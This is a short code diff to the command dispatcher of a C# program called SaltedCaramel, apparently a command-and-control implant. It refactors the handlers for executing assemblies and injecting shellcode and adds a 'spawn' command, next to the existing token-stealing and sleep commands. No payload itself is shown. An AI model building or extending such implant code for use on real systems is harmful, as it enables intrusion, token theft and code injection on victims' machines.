@@ -47,7 +47,7 @@ namespace SaltedCaramel
             else if (this.command == "execute_assembly")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to execute assembly " + this.@params);
-                Tasks.Assembly.Execute(this, implant);
+                Tasks.ExecAssembly.Execute(this, implant);
             }
             else if (this.command == "exit")
             {
@@ -113,7 +113,7 @@ namespace SaltedCaramel
             else if (this.command == "shinject")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to run shellcode.");
-                Shellcode.Execute(this, implant);
+                Shellcode.Execute(this);
             }
             else if (this.command == "sleep")
             {
@@ -130,6 +130,11 @@ namespace SaltedCaramel
                     this.status = "error";
                     this.message = "Please provide an integer value";
                 }
+            }
+            else if (this.command == "spawn")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to spawn");
+                Spawn.Execute(this);
             }
             else if (this.command == "steal_token")
             {
